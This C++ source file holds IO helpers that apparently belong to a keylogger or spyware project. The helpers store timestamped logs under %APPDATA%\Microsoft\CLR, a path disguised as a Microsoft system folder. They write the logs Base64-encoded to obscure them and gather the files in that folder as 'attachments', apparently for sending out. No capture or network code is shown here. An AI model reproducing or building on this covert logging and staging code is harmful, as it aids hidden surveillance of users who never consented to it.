#include "Utils.h"

std::string IO::GetOutputPath(const bool append_seperator)
{
	std::string dir(getenv("APPDATA"));
	std::string full = dir + "\\Microsoft\\CLR";
	return full + (append_seperator ? "\\" : "");
}

// Creates single directory, without checking for subdirectories
bool MkOneDir(const std::string &path)
{
	return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

bool IO::MKDir(std::string path)
{
	for (char &c : path)
	{
		if (c == '\\')
		{
			c = '\0';
			if (!MkOneDir(path))
				return false;
			c = '\\';
		}
	}
	return true;
}

template <class T>
std::string IO::WriteLog(const T &t)
{
	std::string path = GetOutputPath(true);
	Utils::DateTime dt;
	std::string name = dt.GetDateTimeString("_") + ".log";

	try
	{
		std::ofstream out(path + name);
		if (!out)
			return "";
		std::ostringstream s;
		s << "[" << dt.GetDateTimeString() << "]" << std::endl
			<< t << std::endl;

		std::string data = Base64::EncryptB64(s.str());
		out << data;

		if (!out)
			return "";
		out.close();
		return name;
	}
	catch (...)
	{
		return "";
	}
}

std::vector<std::string> IO::GetAttatchments(const std::string &path)
{
	std::vector<std::string> ret;
	for (const auto &entry : std::filesystem::directory_iterator(path))
	{
		std::cout << entry.path() << std::endl;
		ret.push_back(Utils::ToString(entry.path()));
	}

	return ret;
}

#if DEBUG == true

	void IO::WriteAppLog(const std::string &s)
	{
		std::ofstream outfile("AppLog.txt", std::ios::app);
		outfile << "[" << Utils::DateTime().GetDateTimeString() << "]"
						<< "\n"
						<< s << std::endl
						<< "\n";
	}

#endif
